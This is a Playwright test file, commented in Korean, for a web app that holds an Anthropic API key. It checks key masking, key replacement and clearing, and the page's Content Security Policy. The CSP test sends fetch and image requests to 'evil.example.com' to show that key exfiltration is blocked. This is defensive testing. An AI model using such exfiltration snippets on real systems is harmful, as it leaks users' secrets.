// 보안: API 키가 화면(DOM)에 다시 나오지 않음, 보안 정책(CSP)으로 다른 서버 연결 차단
import { test, expect } from '@playwright/test';
import { openApp, sheet, KEY } from './helpers.js';

const REAL_LOOKING = 'sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-a1b2';

test('설정 화면에 저장된 키 전체가 나오지 않고 끝 4자리만 보인다', async ({ page }) => {
  await openApp(page, { settings: { ...KEY, apiKey: REAL_LOOKING } });
  await page.locator('[data-act=settings]').click();
  await expect(sheet(page).locator('.key-status')).toHaveText('저장된 키: sk-ant-api03-…a1b2');
  await expect(sheet(page).locator('[name=apiKey]')).toHaveValue('');
  expect(await page.content()).not.toContain(REAL_LOOKING);
});

test('키 칸을 비워 두고 저장하면 기존 키 유지, 새 키를 적으면 교체', async ({ page }) => {
  await openApp(page, { settings: { ...KEY, apiKey: REAL_LOOKING } });
  const saved = () => page.evaluate(() => JSON.parse(localStorage.getItem('maeip.settings.v1')).apiKey);
  await page.locator('[data-act=settings]').click();
  await sheet(page).locator('button[type=submit]').click();
  expect(await saved()).toBe(REAL_LOOKING);
  await page.locator('[data-act=settings]').click();
  await sheet(page).locator('[name=apiKey]').fill(' sk-ant-new-key-123456789 ');
  await sheet(page).locator('button[type=submit]').click();
  expect(await saved()).toBe('sk-ant-new-key-123456789');
});

test('이 기기에서 키 지우기', async ({ page }) => {
  await openApp(page, { settings: { ...KEY, apiKey: REAL_LOOKING } });
  await page.locator('[data-act=settings]').click();
  page.once('dialog', (d) => d.accept());
  await sheet(page).locator('[data-act=clear-key]').click();
  expect(await page.evaluate(() => JSON.parse(localStorage.getItem('maeip.settings.v1')).apiKey)).toBe('');
  await page.locator('[data-act=settings]').click();
  await expect(sheet(page).locator('.key-status')).toContainText('저장된 키 없음');
});

test('보안 정책(CSP): Anthropic 외 다른 서버로는 데이터를 보낼 수 없다', async ({ page }) => {
  await openApp(page);
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  expect(csp).toContain("connect-src 'self' https://api.anthropic.com");
  expect(csp).toContain("script-src 'self'");
  const result = await page.evaluate(async () => {
    try {
      await fetch('https://evil.example.com/steal', { method: 'POST', body: 'key' });
      return 'sent';
    } catch {
      return 'blocked';
    }
  });
  expect(result).toBe('blocked');
  // 이미지로 몰래 보내기도 차단
  const img = await page.evaluate(
    () =>
      new Promise((resolve) => {
        const i = new Image();
        i.onload = () => resolve('loaded');
        i.onerror = () => resolve('blocked');
        i.src = 'https://evil.example.com/p.gif?k=1';
      }),
  );
  expect(img).toBe('blocked');
});
